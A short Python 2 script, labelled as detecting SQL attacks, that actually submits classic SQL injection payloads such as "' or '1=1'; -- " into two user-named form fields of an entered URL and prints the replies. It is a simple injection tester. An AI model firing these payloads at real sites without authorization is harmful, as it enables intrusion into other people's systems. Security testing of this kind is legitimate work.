# This python file is to detect SQL attacks
import requests
def detectSQLattack():
    # Get the URL
    print 'Please enter the url : '
    url = raw_input()
    # Get the number of form fields
    print 'Please enter the number of form fields in the website : '
    n = int(raw_input())
    # Get the names and values in each of the form fields
    jsonData = {}
    print 'Enter name of form field 1'
    fieldName1 = raw_input()
    print 'Enter name of form field 2'
    fieldName2 = raw_input()
    # Check different cases
    print 'Checking for classic case'
    fieldValue1 = "\\' or '1=1'; -- "
    fieldValue2 = ''
    jsonData[fieldName1] = fieldValue1
    jsonData[fieldName2] = fieldValue2
    response = requests.post(url,jsonData)
    print response.text

    print 'Checking for error messages'


    fieldValue1 = "\\' or '1=1"
    fieldValue2 = "\\' or '1=1"
    jsonData[fieldName1] = fieldValue1
    jsonData[fieldName2] = fieldValue2
    response = requests.post(url,jsonData)
    print response.text


    print 'Checking for error messages'


    fieldValue1 = ""
    fieldValue2 = "\\' or '1=1'; -- "
    jsonData[fieldName1] = fieldValue1
    jsonData[fieldName2] = fieldValue2
    response = requests.post(url, jsonData)
    print response.text

    print 'Checking for error messages'